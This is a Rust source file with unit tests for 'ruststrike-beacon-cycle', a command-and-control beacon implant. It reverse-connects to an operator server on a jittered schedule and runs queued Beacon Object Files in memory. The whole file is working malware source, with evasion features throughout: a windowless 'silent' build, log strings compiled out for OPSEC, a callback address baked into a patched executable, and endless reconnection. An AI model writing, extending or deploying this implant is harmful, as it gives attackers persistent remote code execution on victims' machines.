//! ruststrike-beacon-cycle: a **short-cycle** beacon-style implant.
//!
//! It is a sibling of `crates/beacon` (same wire protocol, same in-process BOF
//! loader, same OPSEC cover identity) with a different link model: instead of
//! holding a persistent channel that only sleeps when the server closes it, a
//! **cycle** agent makes a **short-lived** connection on a cadence.
//!
//! Each cycle:
//! 1. Reverse-connects to the core and sends a proactive `hello`.
//! 2. For a **dwell** window (configurable seconds) it reads + runs any BOFs
//!    the operator queued, replying inline.
//! 3. When the dwell window elapses (or the server closes/EOF) it **actively
//!    closes** the connection.
//! 4. Sleeps **sleep** seconds (± jitter) and starts the next cycle — forever.
//!
//! This is the classic "short-connection / periodic callback" beacon: traffic
//! is periodic short pulses rather than a persistent channel, and the operator
//! can queue commands that land on the next check-in. It never gives up —
//! restart the server, take it down for an hour, change its IP — the agent
//! keeps cycling and reappears as soon as the server is reachable.
//!
//! Config sources (first wins per field — CLI flag, then positional, then env,
//! then the appended-config trailer, then defaults):
//!
//!   beacon-cycle <host> [port] [sleep_secs] [dwell_secs]
//!                              [--sleep S] [--dwell D] [--jitter <pct>]
//!                              [--host H] [--port P]
//!   env:  CYCLE_HOST / CYCLE_PORT / CYCLE_SLEEP (secs) / CYCLE_DWELL (secs)
//!         / CYCLE_JITTER (pct)
//!   trailer: the same opaque magic the implant/beacon uses, with a 4-field
//!            layout `host\0port\0sleep\0dwell\0` (dwell optional — defaults
//!            to 2s when absent). Lets a patched stub cycle with no args.
//!   defaults: 127.0.0.1:4444, sleep 5s, dwell 2s, jitter 0%.
//!
//! Two bin targets link this lib:
//!   - `ruststrike-beacon-cycle`        — console subsystem (dev)
//!   - `ruststrike-beacon-cycle-silent` — GUI subsystem (no window; deployed)

use anyhow::{Context, Result};
use ruststrike_loader::run_bof;
use ruststrike_protocol::{decode_bof, ImplantMessage, ServerMessage};
use std::io::{BufRead, BufReader, BufWriter, Read, Seek, Write};
use std::net::TcpStream;
use std::sync::mpsc;
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

/// Verbose log macro. Compiles to a no-op unless the `verbose` feature is on,
/// so the format strings are absent from a default release build (same OPSEC
/// gating as the implant's `vlog!`). Wrapped in a block so it's valid in both
/// statement and expression position (e.g. inside a `match` arm).
macro_rules! vlog {
    ($($arg:tt)*) => {{
        #[cfg(feature = "verbose")]
        eprintln!($($arg)*);
    }};
}

/// Magic marker the stub builder appends to a prebuilt exe so it cycles against
/// a baked-in host:port without CLI args. Layout (cycle variant, 4 fields):
///   <exe bytes>... <TRAILER_MAGIC> <host> "\x00" <port> "\x00" <sleep> "\x00"
///   <dwell> "\x00"
/// The beacon-cycle reads the last ~512 bytes of its own exe to find it. This
/// is the SAME opaque byte sequence the implant/beacon uses, so the existing
/// stub builder (`tools/stubbuilder` + `/api/stub/build`) can patch a cycle exe
/// too — the stub builder just appends the extra `sleep\0dwell\0` fields for
/// the cycle variant.
const TRAILER_MAGIC: &[u8] = &[0x7C, 0x53, 0x9A, 0x2E, 0xD1, 0x04, 0xB8, 0x6F, 0x11, 0xA3];

/// Default dwell (connection-hold window) in seconds when the trailer or env
/// doesn't specify one. Matches the GUI's default Dwell Time.
const DEFAULT_DWELL_SECS: u64 = 2;

/// Resolved cycle configuration. `sleep` is the time between check-ins (the
/// callback cadence); `dwell` is how long each connection stays open to receive
/// commands; `jitter` is the ±fraction applied to `sleep` (0.0..=0.5) to avoid
/// a perfectly periodic callback pattern.
#[derive(Debug, Clone)]
struct Config {
    host: String,
    port: u16,
    sleep: Duration,
    dwell: Duration,
    jitter: f64,
}

/// Cycle entry point. Resolves config, then loops forever: connect + hello,
/// drain commands for the dwell window, actively close, sleep `sleep` (±jitter),
/// repeat. Never returns under normal operation — only an unwind/panic stops
/// it. Shared by the console and silent (GUI-subsystem) bin targets.
pub fn run() -> Result<()> {
    let cfg = Config::resolve();
    vlog!(
        "[cycle] {}:{} sleep={:?} dwell={:?} jitter={:.0}%",
        cfg.host,
        cfg.port,
        cfg.sleep,
        cfg.dwell,
        cfg.jitter * 100.0
    );
    loop {
        match cycle(&cfg) {
            Ok(()) => vlog!("[cycle] connection closed cleanly"),
            Err(e) => {
                let _ = &e; // referenced only by vlog! (verbose feature)
                vlog!("[cycle] cycle failed: {e:#}")
            }
        }
        let sleep = jittered(cfg.sleep, cfg.jitter);
        vlog!("[cycle] sleeping {:?} before next check-in", sleep);
        thread::sleep(sleep);
    }
}

/// One cycle: connect to the core, send a proactive `hello`, spawn the reader
/// thread, and pump outbound replies until EITHER the dwell window elapses OR
/// the server closes the stream. When the dwell window elapses the connection
/// is actively closed (the reader's `read_line` is bounded by a read timeout,
/// so it returns promptly and `cycle` returns). Returns when the connection is
/// closed (dwell timeout, server close, or dial failure) so `run()` can sleep
/// and retry. Errors are non-fatal — they just feed the log before the retry.
fn cycle(cfg: &Config) -> Result<()> {
    let addr = format!("{}:{}", cfg.host, cfg.port);
    let stream = TcpStream::connect(&addr).with_context(|| format!("connecting {addr}"))?;
    vlog!("[cycle] connected to {addr}");

    // Bound each read by the dwell window. A `read_line` that exceeds `dwell`
    // returns a WouldBlock/timeout error → the reader loop exits → the channel
    // closes → `rx.iter()` returns → `cycle` returns and the stream is dropped
    // (actively closed). This is what makes each cycle a short pulse rather
    // than a persistent channel.
    stream
        .set_read_timeout(Some(cfg.dwell))
        .context("setting read timeout")?;

    let read_stream = stream.try_clone().context("cloning stream")?;
    let writer = BufWriter::new(stream);

    let (tx, rx) = mpsc::channel::<ImplantMessage>();
    let send_tx = tx.clone();

    // Reader thread: server -> dispatch. Exits on EOF, read error, or when the
    // dwell read-timeout fires (the channel then closes so `rx.iter()` returns).
    thread::spawn(move || reader_loop(read_stream, send_tx));
    drop(tx);

    let mut writer = writer;
    // Proactive check-in so the core sees the cycle agent the moment it
    // connects. The "cycle" marker disambiguates it from the stock implant and
    // the long-connection beacon.
    let _ = send(&mut writer, &ImplantMessage::Hello {
        data: "cycle".to_string(),
    });

    for msg in rx.iter() {
        if send(&mut writer, &msg).is_err() {
            vlog!("[cycle] connection lost");
            break;
        }
    }
    Ok(())
}

/// Reader/dispatch loop. Mirrors the beacon's: one JSON `ServerMessage` per
/// line → `handle` → reply on the channel. Exits on EOF, a read error, or when
/// the dwell read-timeout fires (read_line returns a timeout error — treated
/// as a clean cycle end, not a hard failure).
fn reader_loop(stream: TcpStream, tx: mpsc::Sender<ImplantMessage>) {
    let mut reader = BufReader::new(stream);
    let mut line = String::new();
    loop {
        line.clear();
        match reader.read_line(&mut line) {
            Ok(0) => {
                vlog!("[cycle] server closed connection");
                break;
            }
            Ok(_) => {
                let trimmed = line.trim();
                if trimmed.is_empty() {
                    continue;
                }
                let msg = match serde_json::from_str::<ServerMessage>(trimmed) {
                    Ok(m) => m,
                    Err(e) => {
                        let _ = tx.send(ImplantMessage::Error {
                            data: format!("bad request ({e})"),
                        });
                        continue;
                    }
                };
                let reply = handle(msg);
                if tx.send(reply).is_err() {
                    break;
                }
            }
            Err(e) => {
                // A read timeout (dwell window elapsed) is the normal cycle end
                // — break quietly so `cycle` returns and `run()` sleeps. Other
                // errors (reset, etc.) also just end the cycle.
                let timed_out = e.kind() == std::io::ErrorKind::WouldBlock
                    || e.kind() == std::io::ErrorKind::TimedOut;
                if !timed_out {
                    vlog!("[cycle] read error: {e}");
                }
                break;
            }
        }
    }
}

/// Dispatch a server message to a reply. `Hello` and `Bof` behave exactly as in
/// the stock implant / beacon (same loader, same BOF arg decoding). Relay is
/// declined — a cycle agent's link is short-lived, so a long-lived pivot
/// listener on it isn't meaningful; the core gets a `relay_error` /
/// `relay_stopped` so it doesn't wait on `relay_started`.
fn handle(msg: ServerMessage) -> ImplantMessage {
    match msg {
        ServerMessage::Hello => ImplantMessage::Hello {
            data: "ready".to_string(),
        },
        ServerMessage::Bof { file, args } => {
            let coff = match decode_bof(&file) {
                Ok(b) => b,
                Err(e) => {
                    return ImplantMessage::Error {
                        data: format!("decode: {e}"),
                    };
                }
            };
            let args_bytes = decode_bof(&args).unwrap_or_default();
            match run_bof(&coff, &args_bytes) {
                Ok(output) => ImplantMessage::Output { data: output },
                Err(e) => ImplantMessage::Error {
                    data: format!("exec: {e:#}"),
                },
            }
        }
        ServerMessage::RelayListen { relay_id, .. } => ImplantMessage::RelayError {
            relay_id,
            data: "cycle mode: relay unsupported (short-lived link)".to_string(),
        },
        ServerMessage::RelayStop { relay_id } => ImplantMessage::RelayStopped { relay_id },
    }
}

fn send(writer: &mut BufWriter<TcpStream>, msg: &ImplantMessage) -> Result<()> {
    writer.write_all(msg.to_json().as_bytes())?;
    writer.write_all(b"\n")?;
    writer.flush()?;
    Ok(())
}

/// Apply ±`jitter` to `base`. With jitter=0 the base is returned unchanged.
/// `jitter` is clamped to [0, 0.5] at config time so the result never goes
/// negative or to zero.
fn jittered(base: Duration, jitter: f64) -> Duration {
    if jitter <= 0.0 {
        return base;
    }
    let r = next01(); // 0..1
    let factor = 1.0 + (r * 2.0 - 1.0) * jitter; // 1 ± jitter
    let factor = factor.max(0.25);
    base.mul_f64(factor)
}

// --- tiny deterministic-enough RNG for jitter (no external dep) -------------
// A xorshift64 seeded from the wall clock per thread. Jitter doesn't need
// cryptographic quality — just enough to avoid a perfectly periodic callback.

thread_local! {
    static RNG: std::cell::Cell<u64> = std::cell::Cell::new(seed());
}

fn seed() -> u64 {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos() as u64)
        .unwrap_or(0x9E3779B97F4A7C15);
    // Mix in the thread id so two agents launched the same nanosecond still
    // diverge. `as_usize` is stable enough for a non-crypto seed.
    let tid = thread::current().id();
    let tid_hash = format!("{tid:?}").bytes().fold(0u64, |acc, b| acc.wrapping_mul(31).wrapping_add(b as u64));
    nanos ^ tid_hash.wrapping_mul(0x9E3779B97F4A7C15)
}

fn next_u64() -> u64 {
    RNG.with(|cell| {
        let mut x = cell.get();
        if x == 0 {
            x = 0x9E3779B97F4A7C15;
        }
        x ^= x << 13;
        x ^= x >> 7;
        x ^= x << 17;
        cell.set(x);
        x
    })
}

/// Uniform float in [0, 1).
fn next01() -> f64 {
    (next_u64() >> 11) as f64 / ((1u64 << 53) as f64)
}

// --- config resolution ------------------------------------------------------

impl Config {
    fn resolve() -> Config {
        let args: Vec<String> = std::env::args().skip(1).collect();
        let mut host: Option<String> = None;
        let mut port: Option<u16> = None;
        let mut sleep: Option<u64> = None;
        let mut dwell: Option<u64> = None;
        let mut jitter_pct: Option<f64> = None;

        let mut i = 0;
        while i < args.len() {
            let a = &args[i];
            // long/short flags with an explicit value
            if (a == "--jitter" || a == "-j") && i + 1 < args.len() {
                jitter_pct = args[i + 1].parse::<f64>().ok();
                i += 2;
                continue;
            } else if a == "--sleep" && i + 1 < args.len() {
                sleep = args[i + 1].parse::<u64>().ok();
                i += 2;
                continue;
            } else if a == "--dwell" && i + 1 < args.len() {
                dwell = args[i + 1].parse::<u64>().ok();
                i += 2;
                continue;
            } else if a == "--host" && i + 1 < args.len() {
                host = Some(args[i + 1].clone());
                i += 2;
                continue;
            } else if a == "--port" && i + 1 < args.len() {
                port = args[i + 1].parse::<u16>().ok();
                i += 2;
                continue;
            } else if host.is_none() {
                host = Some(a.clone());
            } else if port.is_none() {
                port = a.parse::<u16>().ok();
            } else if sleep.is_none() {
                sleep = a.parse::<u64>().ok();
            } else if dwell.is_none() {
                dwell = a.parse::<u64>().ok();
            }
            i += 1;
        }

        // Trailer is the floor for host:port[:sleep[:dwell]] (a patched stub);
        // CLI/env override each field independently. A cycle stub carries the
        // callback sleep + dwell as third/fourth trailer fields.
        let (t_host, t_port, t_sleep, t_dwell) =
            read_trailer_config().unwrap_or(("127.0.0.1".to_string(), 4444, None, None));

        let host = host.or_else(|| env("CYCLE_HOST")).unwrap_or(t_host);
        let port = port
            .or_else(|| env("CYCLE_PORT").and_then(|s| s.parse().ok()))
            .unwrap_or(t_port);
        let sleep_secs = sleep
            .or_else(|| env("CYCLE_SLEEP").and_then(|s| s.parse().ok()))
            .or(t_sleep)
            .unwrap_or(5);
        let dwell_secs = dwell
            .or_else(|| env("CYCLE_DWELL").and_then(|s| s.parse().ok()))
            .or(t_dwell)
            .unwrap_or(DEFAULT_DWELL_SECS);
        let jitter_pct = jitter_pct
            .or_else(|| env("CYCLE_JITTER").and_then(|s| s.parse().ok()))
            .unwrap_or(0.0);
        let jitter = (jitter_pct / 100.0).clamp(0.0, 0.5);

        Config {
            host,
            port,
            sleep: Duration::from_secs(sleep_secs),
            dwell: Duration::from_secs(dwell_secs),
            jitter,
        }
    }
}

fn env(key: &str) -> Option<String> {
    std::env::var(key).ok().filter(|s| !s.is_empty())
}

/// Read the appended-config trailer from this exe, if present. Reads only the
/// last 512 bytes, finds the opaque magic, parses
/// `host\0port\0[sleep\0[dwell\0]]`.
///
/// The third field is the callback sleep in seconds, the fourth is the dwell
/// (connection-hold) seconds — both appended by the stub builder when
/// generating a cycle agent. The third/fourth fields are optional: a trailer
/// with only `host\0port\0` yields `sleep=None, dwell=None` and the cycle falls
/// back to env/CLI/default. Returns None entirely if the magic is absent or
/// host/port are malformed.
fn read_trailer_config() -> Option<(String, u16, Option<u64>, Option<u64>)> {
    let exe_path = std::env::current_exe().ok()?;
    let mut f = std::fs::File::open(&exe_path).ok()?;
    let len = f.metadata().ok()?.len();
    if len == 0 {
        return None;
    }
    let window: u64 = 512;
    let start = len.saturating_sub(window);
    f.seek(std::io::SeekFrom::Start(start)).ok()?;
    let mut tail = Vec::with_capacity((len - start) as usize);
    f.read_to_end(&mut tail).ok()?;
    parse_trailer_tail(&tail)
}

/// Pure parser over a tail buffer (the last ~512 bytes of an exe). Split out of
/// `read_trailer_config` so the field-parsing logic — including the optional
/// sleep + dwell — is unit-testable without writing a real exe. Returns
/// `(host, port, optional sleep_secs, optional dwell_secs)`.
///
/// The trailer is `magic host\0port\0[sleep\0[dwell\0]]`. A trailer with dwell
/// but no sleep is NOT a valid shape (the stub builder always writes sleep
/// before dwell), so dwell is only read when sleep is present — a 4-field
/// trailer with an empty sleep slot still yields sleep=None, and any trailing
/// dwell slot is ignored in that case. The split-based walk handles the
/// optional fields uniformly without per-field offset math.
fn parse_trailer_tail(tail: &[u8]) -> Option<(String, u16, Option<u64>, Option<u64>)> {
    let idx = find_subslice(tail, TRAILER_MAGIC)?;
    let body = &tail[idx + TRAILER_MAGIC.len()..];
    // Split the body on NUL bytes. `host` is fields[0], `port` is fields[1],
    // `sleep` (optional) is fields[2], `dwell` (optional) is fields[3]. Trailing
    // empty splits (from the terminal NUL) are harmless — they parse to None.
    let fields: Vec<&[u8]> = body.split(|&b| b == 0).collect();
    if fields.len() < 2 {
        return None;
    }
    let host = std::str::from_utf8(fields[0]).ok()?.to_string();
    let port: u16 = std::str::from_utf8(fields[1]).ok()?.parse().ok()?;
    if host.is_empty() || port == 0 {
        return None;
    }
    let sleep = parse_field(fields.get(2).copied().unwrap_or(&[]));
    // dwell is only meaningful when sleep is present (4-field trailer shape).
    let dwell = if sleep.is_some() {
        parse_field(fields.get(3).copied().unwrap_or(&[]))
    } else {
        None
    };
    Some((host, port, sleep, dwell))
}

/// Parse one optional NUL-delimited decimal field. Returns None if the slice is
/// empty or doesn't parse to a positive u64.
fn parse_field(field: &[u8]) -> Option<u64> {
    if field.is_empty() {
        return None;
    }
    std::str::from_utf8(field)
        .ok()
        .and_then(|s| s.parse::<u64>().ok())
        .filter(|&v| v > 0)
}

fn find_subslice(haystack: &[u8], needle: &[u8]) -> Option<usize> {
    if needle.is_empty() || needle.len() > haystack.len() {
        return None;
    }
    haystack
        .windows(needle.len())
        .position(|w| w == needle)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::TcpListener;

    /// The cycle agent's core guarantee: each connection is short-lived. After
    /// the dwell window elapses (or the server closes) the connection is closed
    /// and `cycle` returns so `run()` can sleep and reconnect. This drives two
    /// full cycles (connect → hello → dwell timeout/EOF → return → reconnect).
    #[test]
    fn cycles_close_after_dwell() {
        let ln = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = ln.local_addr().unwrap();
        let cfg = Config {
            host: addr.ip().to_string(),
            port: addr.port(),
            sleep: Duration::from_millis(1),
            dwell: Duration::from_millis(50),
            jitter: 0.0,
        };

        for n in 0..2 {
            // cycle() dials on its own thread.
            let cfg_c = cfg.clone();
            let agent = thread::spawn(move || cycle(&cfg_c));

            let (s, _) = ln.accept().expect("cycle connects");
            // Read the proactive hello. Scope the reader + stream clone so they
            // drop BEFORE join (otherwise the test-side half keeps the
            // connection open past dwell and the agent never times out).
            {
                let mut r = BufReader::new(s.try_clone().unwrap());
                let mut line = String::new();
                r.read_line(&mut line).expect("hello line");
                assert!(
                    line.contains("\"type\":\"hello\""),
                    "cycle {n}: expected hello, got: {line:?}"
                );
                assert!(line.contains("cycle"), "cycle {n}: hello missing cycle marker");
            }
            drop(s);
            let res = agent.join().expect("cycle thread panicked");
            res.expect("cycle returns after dwell/close (enabling reconnect)");
        }
        // Two cycles completed => the agent reconnected after the first close.
    }

    /// With a server that stays silent, the dwell read-timeout fires and ends
    /// the cycle (rather than blocking forever). This is the "short pulse"
    /// guarantee.
    #[test]
    fn dwell_timeout_ends_cycle() {
        let ln = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = ln.local_addr().unwrap();
        let cfg = Config {
            host: addr.ip().to_string(),
            port: addr.port(),
            sleep: Duration::from_millis(1),
            dwell: Duration::from_millis(80),
            jitter: 0.0,
        };
        let cfg_c = cfg.clone();
        let agent = thread::spawn(move || cycle(&cfg_c));

        let (s, _) = ln.accept().unwrap();
        // Read hello, then hold the connection open WITHOUT sending anything.
        // The agent's dwell read-timeout must fire and end the cycle.
        {
            let mut r = BufReader::new(s.try_clone().unwrap());
            let mut line = String::new();
            r.read_line(&mut line).unwrap();
        }
        // Keep the accepted socket alive past the dwell window by NOT dropping
        // it immediately — the agent's read timeout is what ends the cycle.
        let start = std::time::Instant::now();
        let res = agent.join().expect("cycle thread panicked");
        let elapsed = start.elapsed();
        drop(s);
        res.expect("cycle ends via dwell timeout");
        // The cycle should have ended around the dwell window (80ms), not hung.
        assert!(elapsed >= cfg.dwell, "cycle ended before dwell: {elapsed:?}");
        assert!(elapsed < Duration::from_secs(2), "cycle hung: {elapsed:?}");
    }

    /// If the server is down, cycle errors (not panics) — `run()` logs and
    /// retries.
    #[test]
    fn cycle_fails_cleanly_when_server_down() {
        let ln = TcpListener::bind("127.0.0.1:0").unwrap();
        let addr = ln.local_addr().unwrap();
        drop(ln);

        let cfg = Config {
            host: addr.ip().to_string(),
            port: addr.port(),
            sleep: Duration::from_millis(1),
            dwell: Duration::from_millis(50),
            jitter: 0.0,
        };
        let res = cycle(&cfg);
        assert!(res.is_err(), "expected connect failure, got {res:?}");
    }

    #[test]
    fn jitter_zero_returns_base() {
        let base = Duration::from_secs(10);
        assert_eq!(jittered(base, 0.0), base);
        assert_eq!(jittered(base, -1.0), base);
    }

    #[test]
    fn jitter_stays_within_band() {
        let base = Duration::from_secs(100);
        for _ in 0..64 {
            let d = jittered(base, 0.5);
            assert!(d >= Duration::from_secs(25), "under band: {d:?}");
            assert!(d <= Duration::from_secs(150), "over band: {d:?}");
        }
    }

    /// Trailer parse logic against a synthetic tail. read_trailer_config reads
    /// its own exe so we exercise parse_trailer_tail directly.
    #[test]
    fn parses_trailer_host_port_only() {
        let mut tail = b"some padding bytes that are not the magic\0\0".to_vec();
        tail.extend_from_slice(TRAILER_MAGIC);
        tail.extend_from_slice(b"10.0.0.5");
        tail.push(0);
        tail.extend_from_slice(b"4455");
        tail.push(0);
        // implant-style trailer (no sleep/dwell) → both None
        let (host, port, sleep, dwell) = parse_trailer_tail(&tail).expect("magic present");
        assert_eq!(host, "10.0.0.5");
        assert_eq!(port, 4455);
        assert!(sleep.is_none(), "no sleep field => None");
        assert!(dwell.is_none(), "no dwell field => None");
    }

    /// A cycle trailer carries sleep + dwell (third + fourth fields).
    #[test]
    fn parses_trailer_sleep_dwell() {
        let mut tail = Vec::new();
        tail.extend_from_slice(b"padding");
        tail.extend_from_slice(TRAILER_MAGIC);
        tail.extend_from_slice(b"10.0.0.5");
        tail.push(0);
        tail.extend_from_slice(b"4455");
        tail.push(0);
        tail.extend_from_slice(b"30"); // sleep seconds
        tail.push(0);
        tail.extend_from_slice(b"3"); // dwell seconds
        tail.push(0);
        let (host, port, sleep, dwell) = parse_trailer_tail(&tail).expect("magic present");
        assert_eq!(host, "10.0.0.5");
        assert_eq!(port, 4455);
        assert_eq!(sleep, Some(30));
        assert_eq!(dwell, Some(3));
    }

    /// A trailer with sleep but no dwell → dwell None (falls back to default).
    #[test]
    fn parses_trailer_sleep_only() {
        let mut tail = Vec::new();
        tail.extend_from_slice(TRAILER_MAGIC);
        tail.extend_from_slice(b"10.0.0.5");
        tail.push(0);
        tail.extend_from_slice(b"4455");
        tail.push(0);
        tail.extend_from_slice(b"30"); // sleep, no dwell
        tail.push(0);
        let (host, port, sleep, dwell) = parse_trailer_tail(&tail).expect("magic present");
        assert_eq!(host, "10.0.0.5");
        assert_eq!(port, 4455);
        assert_eq!(sleep, Some(30));
        assert!(dwell.is_none(), "no dwell field => None");

        // sleep of 0 or garbage is treated as absent.
        let mut bad = Vec::new();
        bad.extend_from_slice(TRAILER_MAGIC);
        bad.extend_from_slice(b"h");
        bad.push(0);
        bad.extend_from_slice(b"4455");
        bad.push(0);
        bad.extend_from_slice(b"0");
        bad.push(0);
        let (_, _, s, d) = parse_trailer_tail(&bad).expect("magic present");
        assert!(s.is_none(), "sleep 0 => None");
        assert!(d.is_none());
    }

    /// A trailer with a dwell field but an EMPTY sleep slot must NOT misparse
    /// the dwell value as sleep. The stub builder writes `host\0port\0\0dwell\0`
    /// when a cycle is built with no Sleep Time but a default Dwell — the parser
    /// must yield sleep=None, dwell=None (dwell without sleep is not a valid
    /// shape; the cycle falls back to its defaults rather than treating dwell
    /// as sleep). Regression test for the offset-based misparse.
    #[test]
    fn parses_trailer_empty_sleep_dwell_not_misparsed() {
        let mut tail = Vec::new();
        tail.extend_from_slice(TRAILER_MAGIC);
        tail.extend_from_slice(b"10.0.0.5");
        tail.push(0);
        tail.extend_from_slice(b"4455");
        tail.push(0);
        tail.push(0); // empty sleep slot
        tail.extend_from_slice(b"2"); // a dwell field — must NOT become sleep
        tail.push(0);
        let (host, port, sleep, dwell) = parse_trailer_tail(&tail).expect("magic present");
        assert_eq!(host, "10.0.0.5");
        assert_eq!(port, 4455);
        assert!(sleep.is_none(), "empty sleep slot must not pull dwell value up; got {sleep:?}");
        assert!(dwell.is_none(), "dwell without sleep is not a valid shape; got {dwell:?}");
    }

    #[test]
    fn no_trailer_returns_none() {
        let tail = b"just some exe bytes with no magic marker at all".to_vec();
        assert!(parse_trailer_tail(&tail).is_none());
    }

    /// Config::resolve honors CYCLE_SLEEP / CYCLE_DWELL / CYCLE_JITTER env when
    /// no CLI arg is given (temp-env style: save/restore since tests share a
    /// process).
    #[test]
    fn config_reads_env() {
        let prev_s = std::env::var("CYCLE_SLEEP").ok();
        let prev_d = std::env::var("CYCLE_DWELL").ok();
        let prev_j = std::env::var("CYCLE_JITTER").ok();
        std::env::set_var("CYCLE_SLEEP", "13");
        std::env::set_var("CYCLE_DWELL", "4");
        std::env::set_var("CYCLE_JITTER", "25");
        // No CLI args here (test binary has none relevant), so env wins.
        let cfg = Config::resolve();
        assert_eq!(cfg.sleep, Duration::from_secs(13));
        assert_eq!(cfg.dwell, Duration::from_secs(4));
        assert!((cfg.jitter - 0.25).abs() < 1e-9, "jitter clamped: {}", cfg.jitter);
        // restore
        for (k, v) in [("CYCLE_SLEEP", prev_s), ("CYCLE_DWELL", prev_d), ("CYCLE_JITTER", prev_j)] {
            match v {
                Some(val) => std::env::set_var(k, val),
                None => std::env::remove_var(k),
            }
        }
    }
}
